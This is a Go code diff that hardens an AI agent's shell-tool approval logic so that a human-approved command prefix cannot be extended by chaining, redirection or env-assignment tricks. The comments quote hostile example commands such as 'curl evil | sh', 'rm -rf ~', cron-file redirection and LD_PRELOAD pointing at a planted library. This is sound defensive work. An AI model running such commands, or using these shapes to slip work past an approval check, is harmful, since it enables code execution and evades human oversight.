@@ -292,13 +292,16 @@ func (t *ExecTool) requestRuleApproval(
 	}
 	approved, reason := t.approvalRequester.RequestShellApproval(ctx, sessionID, agentID, t.Name(), toolCallID, "", args)
 	// willRecordGrant=false: an approved D3 ask-rule verdict records no
-	// grant today (RecordPrefixGrant has no caller yet — ADR-092 lane L4's
-	// own scope, see pkg/gateway/rest_tool_registry.go's "prefix-scoped
-	// recording separately" note) — so this is always "allow-once" from
-	// this call site's own point of view, even though a fresh D3 rule
-	// evaluation may separately match an EXISTING prefix grant on a later
-	// call (requestRuleApproval's allCovered branch above, which never
-	// reaches this line).
+	// grant from THIS call site. RecordPrefixGrant does have a live caller
+	// (pkg/gateway/rest_tool_registry.go::approvalGrantRecorder, reached
+	// when a human picks scope=prefix on the [Allow] button) — that is a
+	// SEPARATE decision the human makes on the approval dialog itself, not
+	// something this D3 ask-rule branch records on its own authority. So
+	// this is always "allow-once" from this call site's own point of view,
+	// even though a fresh D3 rule evaluation may separately match an
+	// EXISTING prefix grant (recorded via that other path) on a later call
+	// (requestRuleApproval's allCovered branch above, which never reaches
+	// this line).
 	t.emitApprovalDecision(ctx, sessionID, agentID, command, "rule_ask", approved, reason, false)
 	return approved, reason
 }
@@ -562,9 +565,36 @@ func applyAutoNetworkPosture(policy *sandbox.SandboxPolicy, networkGranted bool)
 // prefix grant, not only the exact-fingerprint one, without pkg/agent
 // reimplementing D3's resolve-and-verify itself.
 //
-// ok is false when args carries no usable "command" string, or the command's
-// head cannot be confidently resolved (a blind spot per FR-020) — the
-// caller MUST treat that as "no prefix grant can apply," never as a match.
+// ok is false when args carries no usable "command" string, the command is
+// not a SINGLE segment (review finding #1 — see below), the segment is not
+// "simple" (finding #1/#2), or the command's head cannot be confidently
+// resolved without normalisation (finding #2) — the caller MUST treat that
+// as "no prefix grant can apply," never as a match.
+//
+// # Review findings #1 and #2 (2026-09-23 security fix lane)
+//
+// Before this fix, this function resolved the head of the WHOLE raw command
+// string via shellCommandHeadDetailed and then tokenised the WHOLE command
+// for argument words — with no chain-operator splitting at all. A prefix
+// grant recorded for "git status" therefore matched "git status && curl
+// evil | sh" (the trailing words after "status" were never inspected
+// beyond a simple ArgPrefix "starts-with" comparison, which by definition
+// never notices what comes AFTER the matched prefix), "git status \nrm -rf
+// ~" (same shape via a newline), and "git status > /etc/cron.d/x" (a
+// redirection riding along as more "argument words"). It also discarded
+// shellCommandHeadDetailed's third return (normalised), so "./git status"
+// (a directory-stripped head) and "PATH=/tmp/evil git status"/
+// "LD_PRELOAD=/tmp/evil.so git status" (a silently-skipped env-assignment
+// prefix — the REAL, correctly-resolved git still runs, just under an
+// attacker-controlled environment) all matched too.
+//
+// The fix: require EXACTLY one D3 segment (splitShellSegments — the same
+// splitter D3's own EvaluateCommand uses, so the two can't drift, per the
+// finding's own instruction), require shellrule.IsSimpleSegment on that one
+// segment (closes the redirection/substitution/subshell/env-assignment
+// shapes in one gate, shared with FullyAllowed's identical fix), and
+// require an UN-normalised head (closes the look-alike/case-fold/directory-
+// strip shape) before ever resolving or tokenising anything.
 func bashPrefixMatchInputs(args map[string]any) (resolvedBinary string, argWords []string, runInBackground bool, ok bool) {
 	command, _ := args["command"].(string)
 	if command == "" {
@@ -572,8 +602,32 @@ func bashPrefixMatchInputs(args map[string]any) (resolvedBinary string, argWords
 	}
 	runInBackground = getBoolArg(args, "run_in_background")
 
-	head, fromExpansion, _ := shellCommandHeadDetailed(command)
-	if fromExpansion || head == "" {
+	segments := splitShellSegments(command)
+	if len(segments) != 1 {
+		// A prefix grant is a single-segment concept — BashPrefixGrantFor
+		// never derives one for a chained command (its own len(segments)!=1
+		// check). The CHECK side must refuse the identical shape: without
+		// this, a grant for "git status" would settle "git status && curl
+		// evil | sh" because the old code only ever inspected the FIRST
+		// segment's head, never noticed a second command chained after it.
+		return "", nil, runInBackground, false
+	}
+	seg := segments[0]
+
+	if !shellRuleSimpleSegment(seg) {
+		// Redirection, command/process substitution, a subshell/grouping,
+		// or a leading env-assignment prefix — none of these may ever be
+		// silently settled by a prefix grant, even when a resolvable head
+		// still sits at the front of the segment.
+		return "", nil, runInBackground, false
+	}
+
+	head, fromExpansion, normalised := shellCommandHeadDetailed(seg)
+	if fromExpansion || normalised || head == "" {
+		// A normalised head (case-folded, directory-prefix stripped —
+		// "./git", "GIT") must never satisfy a grant recorded against the
+		// real, resolved binary; that is exactly the look-alike shape
+		// FR-040 exists to refuse.
 		return "", nil, runInBackground, false
 	}
 	path := os.Getenv("PATH")
@@ -581,12 +635,21 @@ func bashPrefixMatchInputs(args map[string]any) (resolvedBinary string, argWords
 	if err != nil {
 		return "", nil, runInBackground, false
 	}
-	words, tokOK := tokenizeShellWords(command)
+	words, tokOK := tokenizeShellWords(seg)
 	if !tokOK {
 		return "", nil, runInBackground, false
 	}
 	_, args2 := resolveShellHead(words)
 	return resolved, args2, runInBackground, true
+}
+
+// shellRuleSimpleSegment applies shellrule.IsSimpleSegment using this
+// package's own shellRuleOptions() platform selection, so the D4
+// prefix-grant check and the D3 FullyAllowed fast path share one
+// definition of "simple" (review finding #1's own instruction: "use the
+// same segment splitter everywhere so the sites can't drift").
+func shellRuleSimpleSegment(seg string) bool {
+	return shellrule.IsSimpleSegment(seg, shellRuleOptions().Platform)
 }
 
 // BashPrefixGrantCheck is the seam CheckGrantOrRequestApproval's own
